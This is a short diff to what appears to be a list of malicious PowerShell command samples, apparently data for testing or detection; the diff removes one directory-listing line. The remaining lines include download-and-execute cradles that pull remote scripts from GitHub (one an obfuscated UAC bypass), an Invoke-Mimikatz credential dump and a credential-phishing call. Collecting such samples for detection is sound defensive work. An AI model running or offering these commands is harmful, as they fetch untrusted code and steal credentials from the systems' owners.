@@ -1,7 +1,6 @@
 Invoke-CredentialPhisher
 Invoke-Expression -Command "IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/fleschutz/PowerShell/main/scripts/check-admin.ps1')"
 iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/obfuscatedps/dccuac.ps1')
-ls -recurse ; get-childitem -recurse ; gci -recurse
 $Invoke = {IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/fleschutz/PowerShell/main/scripts/check-admin.ps1')}; Invoke-Command -ScriptBlock $Invoke
 powershell -exec bypass -command "Invoke-Mimikatz -DumpCreds"
 powershell.exe -c "Get-CimInstance -class win32_operatingsystem | select -property * | export-csv msdebug.log"
